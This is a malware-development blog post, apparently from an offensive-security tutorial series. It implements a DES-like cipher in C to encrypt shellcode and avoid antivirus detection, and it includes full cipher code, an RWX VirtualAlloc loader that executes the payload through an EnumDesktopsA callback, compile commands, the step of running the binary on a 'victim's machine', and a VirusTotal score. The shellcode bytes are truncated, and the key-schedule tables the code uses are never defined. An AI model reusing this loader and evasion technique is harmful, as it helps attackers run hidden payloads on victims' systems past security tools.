﷽

Hello, cybersecurity enthusiasts and white hackers!        

![cryptography](/assets/images/144/2025-01-15_13-41.png){:class="img-responsive"}     

This post is the result of my own research on using DES-like ciphers on malware development. As usual, exploring various crypto algorithms, I decided to check what would happen if we apply this to encrypt/decrypt the payload.    

More than one year ago, I [wrote post](/malware/2023/02/12/malware-av-evasion-11.html) about encrypting payload via DES algorithm, but the caveat is that I used Windows Crypto API for encryption and decryption, thus increasing its level of detection, since AV engines and EDR do not like the use of functions such as `CryptEncrypt`, `CryptDecrypt`, `CryptAcquireContext`, etc and them always raise suspicions.    

### DES

The Data Encryption Standard (DES) is a block cipher characterized by a `56-bit` key length, which has been pivotal in data security. The Data Encryption Standard (DES) has been identified as susceptible to formidable attacks, resulting in a gradual fall in its use. DES is a block cipher that encrypts data in `64-bit` blocks, meaning `64` bits of plaintext are inputted into DES, resulting in `64` bits of ciphertext. The identical technique and key are employed for both encryption and decryption, with slight variations. The key length measures `56` bits.      

### practical example 

My code for this article implements a simplified version of a "`DES`-like" cipher for encrypting and decrypting data payloads.    

Key components are tables and constants. First of all we needs, permutation tables (e.g., `IP_TABLE`, `FP_TABLE`, `E_TABLE`, etc.). These control how bits are permuted during encryption and decryption:     

```cpp
// initial permutation table
static const uint8_t IP_TABLE[] = {
  58, 50, 42, 34, 26, 18, 10, 2,
  60, 52, 44, 36, 28, 20, 12, 4,
  62, 54, 46, 38, 30, 22, 14, 6,
  64, 56, 48, 40, 32, 24, 16, 8,
  57, 49, 41, 33, 25, 17,  9, 1,
  59, 51, 43, 35, 27, 19, 11, 3,
  61, 53, 45, 37, 29, 21, 13, 5,
  63, 55, 47, 39, 31, 23, 15, 7
};

// final permutation table
static const uint8_t FP_TABLE[] = {
  40, 8, 48, 16, 56, 24, 64, 32,
  39, 7, 47, 15, 55, 23, 63, 31,
  38, 6, 46, 14, 54, 22, 62, 30,
  37, 5, 45, 13, 53, 21, 61, 29,
  36, 4, 44, 12, 52, 20, 60, 28,
  35, 3, 43, 11, 51, 19, 59, 27,
  34, 2, 42, 10, 50, 18, 58, 26,
  33, 1, 41,  9, 49, 17, 57, 25
};

// expansion table
static const uint8_t E_TABLE[] = {
  32, 1, 2, 3, 4, 5,
  4, 5, 6, 7, 8, 9,
  8, 9, 10, 11, 12, 13,
  12, 13, 14, 15, 16, 17,
  16, 17, 18, 19, 20, 21,
  20, 21, 22, 23, 24, 25,
  24, 25, 26, 27, 28, 29,
  28, 29, 30, 31, 32, 1
};

// permutation table
static const uint8_t P_TABLE[] = {
  16, 7, 20, 21,
  29, 12, 28, 17,
  1, 15, 23, 26,
  5, 18, 31, 10,
  2, 8, 24, 14,
  32, 27, 3, 9,
  19, 13, 30, 6,
  22, 11, 4, 25
};
```

Next important things is substitution boxes that map `6-bit` input values to `4-bit` outputs, adding non-linearity:    

```cpp
// S-Boxes
static const uint8_t S_BOXES[8][4][16] = {
  {
    {14,  4, 13,  1,  2, 15, 11,  8,  3, 10,  6, 12,  5,  9,  0,  7},
    { 0, 15,  7,  4, 14,  2, 13,  1, 10,  6, 12, 11,  9,  5,  3,  8},
    { 4,  1, 14,  8, 13,  6,  2, 11, 15, 12,  9,  7,  3, 10,  5,  0},
    {15, 12,  8,  2,  4,  9,  1,  7,  5, 11,  3, 14, 10,  0,  6, 13}
  },
  {
    {15,  1,  8, 14,  6, 11,  3,  4,  9,  7,  2, 13, 12,  0,  5, 10},
    { 3, 13,  4,  7, 15,  2,  8, 14, 12,  0,  1, 10,  6,  9, 11,  5},
    { 0, 14,  7, 11, 10,  4, 13,  1,  5,  8, 12,  6,  9,  3,  2, 15},
    {13,  8, 10,  1,  3, 15,  4,  2, 11,  6,  7, 12,  0,  5, 14,  9}
  },
  {
    {10,  0,  9, 14,  6,  3, 15,  5,  1, 13, 12,  7, 11,  4,  2,  8},
    {13,  7,  0,  9,  3,  4,  6, 10,  2,  8,  5, 14, 12, 11, 15,  1},
    {13,  6,  4,  9,  8, 15,  3,  0, 11,  1,  2, 12,  5, 10, 14,  7},
    { 1, 10, 13,  0,  6,  9,  8,  7,  4, 15, 14,  3, 11,  5,  2, 12}
  },
  {
    { 7, 13, 14,  3,  0,  6,  9, 10,  1,  2,  8,  5, 11, 12,  4, 15},
    {13,  8, 11,  5,  6, 15,  0,  3,  4,  7,  2, 12,  1, 10, 14,  9},
    {10,  6,  9,  0, 12, 11,  7, 13, 15,  1,  3, 14,  5,  2,  8,  4},
    { 3, 15,  0,  6, 10,  1, 13,  8,  9,  4,  5, 11, 12,  7,  2, 14}
  },
  {
    { 2, 12,  4,  1,  7, 10, 11,  6,  8,  5,  3, 15, 13,  0, 14,  9},
    {14, 11,  2, 12,  4,  7, 13,  1,  5,  0, 15, 10,  3,  9,  8,  6},
    { 4,  2,  1, 11, 10, 13,  7,  8, 15,  9, 12,  5,  6,  3,  0, 14},
    {11,  8, 12,  7,  1, 14,  2, 13,  6, 15,  0,  9, 10,  4,  5,  3}
  },
  {
    {12,  1, 10, 15,  9,  2,  6,  8,  0, 13,  3,  4, 14,  7,  5, 11},
    {10, 15,  4,  2,  7, 12,  9,  5,  6,  1, 13, 14,  0, 11,  3,  8},
    { 9, 14, 15,  5,  2,  8, 12,  3,  7,  0,  4, 10,  1, 13, 11,  6},
    { 4,  3,  2, 12,  9,  5, 15, 10, 11, 14,  1,  7,  6,  0,  8, 13}
  },
  {
    { 4, 11,  2, 14, 15,  0,  8, 13,  3, 12,  9,  7,  5, 10,  6,  1},
    {13,  0, 11,  7,  4,  9,  1, 10, 14,  3,  5, 12,  2, 15,  8,  6},
    { 1,  4, 11, 13, 12,  3,  7, 14, 10, 15,  6,  8,  0,  5,  9,  2},
    { 6, 11, 13,  8,  1,  4, 10,  7,  9,  5,  0, 15, 14,  2,  3, 12}
  },
  {
    {13,  2,  8,  4,  6, 15, 11,  1, 10,  9,  3, 14,  5,  0, 12,  7},
    { 1, 15, 13,  8, 10,  3,  7,  4, 12,  5,  6, 11,  0, 14,  9,  2},
    { 7, 11,  4,  1,  9, 12, 14,  2,  0,  6, 10, 13, 15,  3,  5,  8},
    { 2,  1, 14,  7,  4, 10,  8, 13, 15, 12,  9,  0,  3,  5,  6, 11}
  }
};
```

And we need a shift table, this table specifies the number of left rotations applied to key segments during round key generation:     

```cpp
// key shifts per round
static const uint8_t SHIFT_TABLE[] = {
  1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1
};
```

Permutation function permutes bits based on the provided table. This is a core operation in the `DES` process:    

```cpp
// function for bit permutation
uint64_t permute(uint64_t input, const uint8_t *table, int table_size) {
  uint64_t output = 0;
  for (int i = 0; i < table_size; i++) {
    if ((input >> (64 - table[i])) & 1) {
      output |= (1ULL << (table_size - 1 - i));
    }
  }
  return output;
}
```

Function `left_shift` circularly shifts bits to the left by a specified number of positions:    

```cpp
// function for left shift
uint64_t left_shift(uint64_t input, int shift, int size) {
  return ((input << shift) | (input >> (size - shift))) & ((1ULL << size) - 1);
}
```

Next one is `generate_round_keys` function. This function creates `16` round-specific keys from the main key by permuting and shifting bits:    

```cpp
// function to generate round keys
void generate_round_keys(uint64_t key, uint64_t *round_keys) {
  uint64_t permuted_key = permute(key, PC1_TABLE, sizeof(PC1_TABLE));
  uint64_t C = (permuted_key >> 28) & ((1ULL << 28) - 1);
  uint64_t D = permuted_key & ((1ULL << 28) - 1);

  for (int round = 0; round < 16; round++) {
    C = left_shift(C, SHIFT_TABLE[round], 28);
    D = left_shift(D, SHIFT_TABLE[round], 28);
    uint64_t combined_key = (C << 28) | D;
    round_keys[round] = permute(combined_key, PC2_TABLE, sizeof(PC2_TABLE));
  }
}
```

The Feistel function performs a series of operations on the right half of the data block, including expansion, `XOR` with the round key, substitution using `S-Box`es, and permutation:    

```cpp
// function for the Feistel function
uint64_t feistel(uint64_t R, uint64_t round_key) {
  uint64_t expanded_R = permute(R, E_TABLE, sizeof(E_TABLE));
  uint64_t xor_result = expanded_R ^ round_key;
  uint64_t s_box_result = 0;

  for (int i = 0; i < 8; i++) {
    uint8_t row = ((xor_result >> (42 - (i * 6))) & 0x2) | ((xor_result >> (47 - (i * 6))) & 0x1);
    uint8_t col = (xor_result >> (43 - (i * 6))) & 0xF;
    uint8_t s_box_value = S_BOXES[i][row][col];
    s_box_result |= (uint64_t)s_box_value << (28 - (i * 4));
  }
  return permute(s_box_result, P_TABLE, sizeof(P_TABLE));
}
```

Functions `des_encrypt_block / des_decrypt_block` perform `DES` encryption/decryption on `64-bit` blocks of data using the round keys:     

```cpp
// function for DES encryption
void des_encrypt_block(uint8_t *block, uint64_t *round_keys) {
  uint64_t input = 0;
  for (int i = 0; i < 8; i++) {
    input = (input << 8) | block[i];
  }
  uint64_t permuted_input = permute(input, IP_TABLE, sizeof(IP_TABLE));
  uint64_t L = (permuted_input >> 32) & 0xFFFFFFFF;
  uint64_t R = permuted_input & 0xFFFFFFFF;

  for (int i = 0; i < 16; i++) {
    uint64_t next_L = R;
    uint64_t next_R = L ^ feistel(R, round_keys[i]);
    L = next_L;
    R = next_R;
  }

  uint64_t combined = (R << 32) | L;
  uint64_t output = permute(combined, FP_TABLE, sizeof(FP_TABLE));

  for (int i = 7; i >= 0; i--) {
    block[i] = (output >> (i * 8)) & 0xFF;
  }
}

// function for DES decryption
void des_decrypt_block(uint8_t *block, uint64_t *round_keys) {
  uint64_t input = 0;
  for (int i = 0; i < 8; i++) {
    input = (input << 8) | block[i];
  }
  uint64_t permuted_input = permute(input, IP_TABLE, sizeof(IP_TABLE));
  uint64_t L = (permuted_input >> 32) & 0xFFFFFFFF;
  uint64_t R = permuted_input & 0xFFFFFFFF;

  for (int i = 15; i >= 0; i--) {
    uint64_t next_R = L;
    uint64_t next_L = R ^ feistel(L, round_keys[i]);
    L = next_L;
    R = next_R;
  }
  uint64_t combined = (R << 32) | L;
  uint64_t output = permute(combined, FP_TABLE, sizeof(FP_TABLE));

  for (int i = 7; i >= 0; i--) {
    block[i] = (output >> (i * 8)) & 0xFF;
  }
}
```

For example, consider `des_encrypt_block`. How it works? The input block is permuted using `IP_TABLE`. Then the `64-bit` block is divided into `32-bit` left (`L`) and right (`R`) halves. And we doing `16` rounds of Feistel operations. In each round:
- The Feistel function is applied to the right half.    
- The left half is XORed with the Feistel result.    
- The halves are swapped.    

The final block is recombined and permuted using `FP_TABLE`.    

The next function is encrypts the entire payload by splitting it into `8-byte` blocks and encrypting each block:     

```cpp
// function to encrypt the payload
void des_encrypt_payload(unsigned char *payload, int payload_len, uint64_t key) {
  uint64_t round_keys[16];
  generate_round_keys(key, round_keys);

  int i;
  for (i = 0; i < payload_len / BLOCK_SIZE; i++) {
    des_encrypt_block(payload + i * BLOCK_SIZE, round_keys);
  }
  int remaining = payload_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, payload + (payload_len / BLOCK_SIZE) * BLOCK_SIZE, remaining);
    des_encrypt_block(pad, round_keys);
    memcpy(payload + (payload_len / BLOCK_SIZE) * BLOCK_SIZE, pad, remaining);
  }
}
```

As you can see, this function ensures that all blocks are processed, including padding for the last block if necessary.    

The `des_decrypt_payload` function decrypts the payload and prints it to verify successful decryption.     

In the `main` function, the decrypted payload is loaded into memory using `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` permissions, the `EnumDesktopsA` API is called with a pointer to the loaded payload. [This is a way](/tutorial/2022/06/27/malware-injection-20.html) to attempt indirect execution of the decrypted payload:    

```cpp
// example usage
int main() {
  unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"

  "\x2e\x2e\x5e\x3d\x00";
  int my_payload_len = sizeof(my_payload) - 1;

  uint64_t key = 0x0123456789ABCDEF;

  int pad_len = my_payload_len + (BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
  unsigned char padded[pad_len];
  memset(padded, 0x90, pad_len);
  memcpy(padded, my_payload, my_payload_len);


  printf("original payload: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", my_payload[i]);
  }
  printf("\n\n");

  des_encrypt_payload(padded, pad_len, key);

  printf("encrypted payload: ");
   for (int i = 0; i < pad_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  des_decrypt_payload(padded, pad_len, key);

  printf("decrypted payload: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");
  
  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);

  return 0;
}
```

### demo

Let’s go to see everything in action. Compile it (in my `linux` machine):    

```bash
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

![cryptography](/assets/images/144/2025-01-15_13-14.png){:class="img-responsive"}      

Then, just run it in the victim's machine (`windows 11 x64` in my case):    

```powershell
.\hack.exe
```

![cryptography](/assets/images/144/2025-01-15_13-41_1.png){:class="img-responsive"}      

Nice! Everything is worked perfectly! =^..^=     

If we analyse DES implementation via Windows Crypto API from [this post](/malware/2023/02/12/malware-av-evasion-11.html) we got this indicator:

As I wrote, this increasing malware's level of detection.     

Let's upload our DES-like algorithm implementation to VirusTotal:

**So, 24 of of 72 AV engines detect our file as malicious.**     

This implementation of the `DES` cipher is not fully compliant with the official Data Encryption Standard (DES) specification. For example, `DES` standard uses a specific `PC-1` (Permutation Choice 1) table to select `56 bits` from the `64-bit` key, and `PC-2` (Permutation Choice 2) for deriving the `48-bit` round keys. It also performs specific left circular shifts for key halves during each round.      
In my code functions `PC1_TABLE`, `PC2_TABLE`, and `SHIFT_TABLE` are implemented, that mimic the key schedule process, but there is no guarantee they match the `DES` standard exactly.      

My code also correctly enforces a block size of `64 bits`, but it adds padding (`0x90` bytes) manually when the input is not a multiple of `8`. As I know, the official `DES` does not define padding behavior - this is handled by higher-level protocols.     

Finally, `DES` specification includes eight substitution boxes (`S-Box`es), which are defined exactly and must not vary. My code implements `S-box`es, which appear to follow the `DES` specification. However, the implementation should be verified against the official `DES` S-Box definitions to ensure they are identical, since I am not sure.

### cryptanalysis

The `DES` has been extensively analyzed since its inception, leading to the development of various cryptanalytic techniques. Here is a some of well-known papers that have significantly contributed to the cryptanalysis of `DES`:    

*Linear Cryptanalysis Method for DES Cipher. Author: Mitsuru Matsui. Computer and Information Systems Laboratory. Mitsubishi Electric Corporation* - Matsui presents linear cryptanalysis, a known-plaintext attack that uses linear approximations to describe the behavior of the block cipher. This method was successfully applied to DES, marking a significant advancement in cryptanalysis.     
[https://luca-giuzzi.unibs.it/corsi/Support/papers-cryptography/Matsui.pdf](https://luca-giuzzi.unibs.it/corsi/Support/papers-cryptography/Matsui.pdf)    

*Linear Cryptanalysis of DES with Asymmetries. Authors: Andrey Bogdanov and Philip S. Vejre. Technical University of Denmark* - The authors explore linear cryptanalysis in the presence of asymmetries within DES. Their findings contribute to a better understanding of how structural non-uniformities can be exploited in cryptanalysis.

*Cryptanalysis of the Full DES and the Full 3DES Using a New Linear Property. Authors: Tomer Ashur and Raluca Posteuca. imec-COSIC, KU Leuven, Leuven, Belgium* - This paper introduces a novel attack method called the "poisonous hull" and applies it to the full DES and 3DES. The study demonstrates the attack's effectiveness and discusses its implications for the security of these ciphers.

I hope this post is useful for malware researchers, C/C++ programmers, spreads awareness to the blue teamers of this interesting encryption technique and analysis tricks, and adds a weapon to the red teamers arsenal.
